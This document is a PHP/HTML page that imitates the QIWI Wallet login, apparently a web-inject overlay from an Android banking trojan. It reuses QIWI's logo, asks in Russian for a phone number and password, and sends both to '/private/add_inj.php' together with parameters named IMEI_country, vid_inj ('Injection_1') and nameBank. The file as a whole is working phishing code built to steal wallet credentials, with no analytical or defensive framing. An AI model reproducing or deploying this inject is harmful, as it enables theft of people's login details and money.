<html><head><meta charset="utf-8"><meta name="viewport"content="width=device-width,initial-scale=1">
<link rel="stylesheet"href="../inj/css/bootstrap.css"type="text/css"media="all"/>
<link rel="stylesheet"href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"type="text/css"media="all"/>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script></head>
<body>

<style type="text/css">
*{
	outline:none;
}
.br{
	border:1px dotted red;
}
.stol{
	display:table;width:100%;
}
.td{
	display:table-cell;
}
.w100{
	width:100%;
}
.left_{
	text-align:left;
}
.right_{
	text-align:right;
}
.center{
	text-align:center;
}
.top{
	vertical-align:top;
}
.bottom{
	vertical-align:bottom;
}
.middle{
	vertical-align:middle;
}
.inline{
	display:inline-block;
}
.pad{
	padding:15px;
}
.tr{
	display:table-row;
}.
none{
	display:none;
}</style>

<style type="text/css">
body{
	background-color:#F2F2F2
}
input.form-control{
	border-radius:3;
}
.control-label{
	font-size:18px;font-weight:600
}
.activeCountry{
	position:absolute;
	left:14px;
	top:25px;
	background-image:url("https://static.qiwi.com/img/ui/flags.png");
	height:11px;
	width:16px;
	cursor:pointer;
	z-index:1;
}
.regionRU{
	background-position:-224px -121px;
}
.regionUA{
	background-position:-96px -154px;
}
.regionBY{
	background-position:-16px -22px;
}
.btn-primary{
	border-radius:0px;
	-moz-border-radius:0px;
	-webkit-border-radius:0px;
	background-color:#283991;
	padding:22px 60px;
	font-size:24px;
}
.has-error.help_text{
	display:block;
}
</style>

<?php 
//$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$IMEI_country = "321|ru";
$vid_inj = "Injection_1";
$nameBank = "vid2";

?>

<form id="mf" action="/private/add_inj.php?p=<?php echo "$IMEI_country|$vid_inj|$nameBank";?>"method="post"onsubmit="return false">
<!--  -->

<!--  -->
<div class=""style="padding:20px 0px;border-bottom:solid 1px #c2c2c2">
<div class="container "style="">
<div class="stol"style="table-layout:fixed">
<div class="td left_  "style="">
<img src="https://static.qiwi.com/img/qiwi_com/landingpages/main/logoWallet.png"style=""class="w100"/>
</div>
<div class="td left_  "style=""></div></div></div></div>
<div class=""style="padding-top:15px">
<div class="container"style="">
<div class="form-group">
<label class="control-label"for="">Войти в мой кошелек</label>
<div class=""style="position:relative"><div class="activeCountry regfionRU"style="">
</div>
<div class=""style="font-size:20px">Введите номер телефона</div>
<input style="padding-left:10px"class="form-control user"type="text"value=""name="user"id="user"placeholder="Введите номер телефона"/>
</div></div>
<div class="form-group"style="padding-top:0px">
<div class=""style="font-size:20px">Введите пароль</div>
<input style="padding-left:10px" class="form-control"type="password"name="pass"id="pass"placeholder="Пароль"/>
</div></div></div>
<div class=""style="padding-top:15px"><div class="container"style="">
<div class="form-group"style="padding-top:0px"><div class="right_ "style="">

<center><button class="btn btn-success"onclick="send_info()"style="font-size:20px; width: 160px;">  Войти  </button></center>

</div></div></div></div>

<div class=""style="padding-top:10px;border-bottom:solid 1px #c2c2c2"></div></div></form></body>
<script>$('.form-control').on('click',function(){$('.has-error').removeClass('has-error');})

function send_info(){var err=false;var number=$('#user').val().trim()
var pass=$('#pass').val().trim()

if(!/^[a-z-A-Z0-9]{1,40}\b/.test(number)||number.length<4){$('#user').closest('.form-group').addClass('has-error');err=true;}
if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){$('#pass').closest('.form-group').addClass('has-error');err=true;}
if(err==true){return;};$('#mf')[0].submit();}

</script>
</html>

